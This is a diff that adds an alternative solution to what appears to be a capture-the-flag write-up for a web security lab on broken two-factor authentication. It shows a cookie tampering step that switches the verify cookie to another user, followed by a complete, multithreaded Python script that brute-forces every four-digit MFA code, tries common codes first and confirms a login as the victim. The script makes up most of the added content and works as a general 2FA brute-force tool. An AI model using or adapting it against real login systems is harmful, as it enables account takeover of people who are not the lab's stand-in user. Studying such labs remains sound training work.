@@ -3384,6 +3384,335 @@ carlos
 
 ---
 
+# Alternative Method (Without Burp Suite Professional)
+### step 1 Step 1: Capture the Login Request 
+> use this for login 
+> Your credentials: wiener:peter
+then we have intercept the request below screen short :
+
+![2fal](images/lgr.png)
+
+### Step 2: Modify the Verify Cookie
+> Cookie: verify=wiener to Cookie: verify=carlos
+![2fal](images/ck.png)
+
+### Step 3: Capture the MFA Verification Request
+
+> After changing the `verify` cookie to `carlos`, submit any 4-digit MFA code and capture the `POST /login2` request.
+> use this script to find the mfa code
+
+```python
+#!/usr/bin/env python3
+"""
+2FA MFA Brute Force - Optimized for Speed
+Works like Burp Suite Professional but faster
+"""
+
+import requests
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from queue import Queue
+import sys
+
+# ===== CONFIGURATION =====
+BASE_URL = "https://0a9b00b8049422c282e9796d0063001a.web-security-academy.net"
+LOGIN2_URL = f"{BASE_URL}/login2"
+VERIFY_COOKIE = "carlos"  # Make sure this is correct!
+
+# Performance settings
+THREADS = 50  # Number of concurrent threads (adjust based on your connection)
+TIMEOUT = 2   # Request timeout in seconds
+BATCH_SIZE = 100  # Show progress every N requests
+
+# ===== SESSION MANAGEMENT =====
+session_lock = threading.Lock()
+request_count = 0
+found_code = None
+stop_flag = False
+
+def create_session():
+    """Create a new session for each thread to avoid conflicts"""
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": BASE_URL,
+        "Referer": f"{BASE_URL}/login2",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive"
+    })
+    return session
+
+def test_mfa_code(code):
+    """Test a single MFA code"""
+    global request_count, found_code, stop_flag
+    
+    if stop_flag or found_code:
+        return None
+    
+    mfa_code = f"{code:04d}"
+    session = create_session()
+    
+    # Create the cookie header
+    cookies = {"verify": VERIFY_COOKIE}
+    
+    try:
+        # Send the POST request with the MFA code
+        response = session.post(
+            LOGIN2_URL,
+            data=f"mfa-code={mfa_code}",
+            cookies=cookies,
+            timeout=TIMEOUT,
+            allow_redirects=False
+        )
+        
+        # Update request counter
+        with session_lock:
+            request_count += 1
+        
+        # Check for successful authentication
+        # Success indicators:
+        # 1. HTTP 302 redirect to /my-account
+        # 2. Location header contains 'my-account'
+        if response.status_code == 302:
+            location = response.headers.get('Location', '')
+            if 'my-account' in location:
+                return mfa_code
+        elif response.status_code == 200:
+            # Sometimes lab uses 200 with different content
+            if "Your username is" in response.text or "carlos" in response.text.lower():
+                return mfa_code
+                
+    except requests.exceptions.Timeout:
+        pass
+    except requests.exceptions.ConnectionError:
+        pass
+    except Exception:
+        pass
+    
+    return None
+
+def brute_force_optimized():
+    """Optimized brute force with thread pooling"""
+    global found_code, stop_flag, request_count
+    
+    print("="*60)
+    print("2FA MFA BRUTE FORCE - OPTIMIZED")
+    print("="*60)
+    print(f"Target: {BASE_URL}")
+    print(f"Verify Cookie: {VERIFY_COOKIE}")
+    print(f"Threads: {THREADS}")
+    print(f"Total codes: 10,000 (0000-9999)")
+    print("="*60)
+    print()
+    
+    start_time = time.time()
+    
+    # Create a list of all codes to test
+    codes_to_test = list(range(10000))
+    
+    # Use ThreadPoolExecutor for concurrent requests
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        # Submit all tasks
+        future_to_code = {
+            executor.submit(test_mfa_code, code): code 
+            for code in codes_to_test
+        }
+        
+        # Process results as they complete
+        for future in as_completed(future_to_code):
+            if stop_flag:
+                break
+                
+            result = future.result()
+            code = future_to_code[future]
+            
+            if result:
+                found_code = result
+                stop_flag = True
+                
+                # Calculate statistics
+                elapsed = time.time() - start_time
+                rate = request_count / elapsed if elapsed > 0 else 0
+                
+                print(f"\n{'!'*60}")
+                print(f"[✓✓✓] SUCCESS! Valid MFA code found: {found_code}")
+                print(f"[✓] Total requests: {request_count}")
+                print(f"[✓] Time elapsed: {elapsed:.2f} seconds")
+                print(f"[✓] Average speed: {rate:.1f} requests/second")
+                print(f"{'!'*60}")
+                break
+            
+            # Show progress every BATCH_SIZE requests
+            if request_count > 0 and request_count % BATCH_SIZE == 0:
+                elapsed = time.time() - start_time
+                rate = request_count / elapsed if elapsed > 0 else 0
+                percent = (request_count / 10000) * 100
+                print(f"[*] Progress: {request_count}/10000 ({percent:.1f}%) - "
+                      f"Speed: {rate:.1f} req/sec - Testing: {code:04d}")
+    
+    elapsed = time.time() - start_time
+    
+    if not found_code:
+        print(f"\n[✗] No valid code found after {request_count} attempts")
+        print(f"[✗] Time elapsed: {elapsed:.2f} seconds")
+        
+        # Try one more time with single thread (more reliable)
+        print("\n[*] Trying single-threaded fallback...")
+        found_code = brute_force_single()
+    
+    return found_code
+
+def brute_force_single():
+    """Fallback: Single-threaded brute force (more reliable but slower)"""
+    session = create_session()
+    cookies = {"verify": VERIFY_COOKIE}
+    
+    for code in range(10000):
+        mfa_code = f"{code:04d}"
+        
+        if code % 500 == 0:
+            print(f"[*] Testing: {mfa_code}")
+        
+        try:
+            response = session.post(
+                LOGIN2_URL,
+                data=f"mfa-code={mfa_code}",
+                cookies=cookies,
+                timeout=TIMEOUT,
+                allow_redirects=False
+            )
+            
+            if response.status_code == 302:
+                location = response.headers.get('Location', '')
+                if 'my-account' in location:
+                    return mfa_code
+        except:
+            continue
+    
+    return None
+
+def smart_brute_force():
+    """Even faster: Smart brute force with common codes first"""
+    print("[*] Using smart brute force (common codes first)...")
+    
+    # Common MFA codes to try first
+    common_codes = [
+        # Sequential
+        "0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999",
+        # Patterns
+        "1234", "4321", "1212", "1122", "1313", "1423", "2468", "1357", "6969", "0420",
+        # Dates
+        "0101", "0112", "1225", "0704", "1102", "1203",
+        # Common numbers
+        "1337", "1984", "2001", "2020", "2021", "2022", "2023", "2024",
+        "0007", "7777", "1122", "3344", "5566", "7788", "9900"
+    ]
+    
+    session = create_session()
+    cookies = {"verify": VERIFY_COOKIE}
+    
+    # Try common codes first
+    for mfa_code in common_codes:
+        print(f"[*] Trying common code: {mfa_code}")
+        try:
+            response = session.post(
+                LOGIN2_URL,
+                data=f"mfa-code={mfa_code}",
+                cookies=cookies,
+                timeout=TIMEOUT,
+                allow_redirects=False
+            )
+            
+            if response.status_code == 302 and 'my-account' in response.headers.get('Location', ''):
+                return mfa_code
+        except:
+            continue
+    
+    # If no common code works, brute force all
+    print("[*] No common code found, brute forcing all codes...")
+    return brute_force_single()
+
+if __name__ == "__main__":
+    print("\n" + "="*60)
+    print("2FA MFA BRUTE FORCE TOOL")
+    print("="*60)
+    print("\nSelect mode:")
+    print("1. Ultra-fast (50 threads) - Default")
+    print("2. Balanced (20 threads)")
+    print("3. Slow but reliable (1 thread)")
+    print("4. Smart mode (common codes first then brute)")
+    
+    mode = input("\nChoice (1-4, default: 1): ").strip()
+    
+    if mode == "2":
+        THREADS = 20
+        BATCH_SIZE = 100
+    elif mode == "3":
+        THREADS = 1
+        BATCH_SIZE = 100
+    elif mode == "4":
+        result = smart_brute_force()
+        if result:
+            print(f"\n[✓] Valid MFA code: {result}")
+        else:
+            print("\n[✗] No code found")
+        sys.exit(0)
+    else:
+        THREADS = 50
+        BATCH_SIZE = 100
+    
+    # Confirm before starting
+    print(f"\n[*] Configuration:")
+    print(f"    - Threads: {THREADS}")
+    print(f"    - Timeout: {TIMEOUT}s")
+    print(f"    - Verify cookie: {VERIFY_COOKIE}")
+    print()
+    
+    confirm = input("Start brute force? (y/n): ").strip().lower()
+    if confirm != 'y':
+        print("Aborted.")
+        sys.exit(0)
+    
+    # Run the brute force
+    result = brute_force_optimized()
+    
+    if result:
+        print(f"\n{'='*60}")
+        print(f"[✓] MFA CODE FOUND: {result}")
+        print(f"[✓] Use this code to log in as Carlos")
+        print(f"{'='*60}")
+        
+        # Verify the code works
+        print("\n[*] Verifying the code...")
+        verify_session = create_session()
+        verify_response = verify_session.post(
+            LOGIN2_URL,
+            data=f"mfa-code={result}",
+            cookies={"verify": VERIFY_COOKIE},
+            allow_redirects=True
+        )
+        
+        if "Your username is" in verify_response.text or "carlos" in verify_response.text.lower():
+            print("[✓] VERIFICATION SUCCESSFUL!")
+            print("[✓] You are now logged in as Carlos")
+        else:
+            print("[!] Code works but verification incomplete")
+    else:
+        print("\n[✗] Attack failed. Possible issues:")
+        print("    1. Check if you've logged in as Carlos first")
+        print("    2. Verify the cookie spelling is correct: 'carlos'")
+        print("    3. The lab URL might have expired")
+        print("    4. Try running the script again")
+
+```
+![2fal](images/so.png)
+
+### lab solved
+![2fal](images/lsol.png)
+
 # Vulnerability Explanation
 
 ### Intended Flow
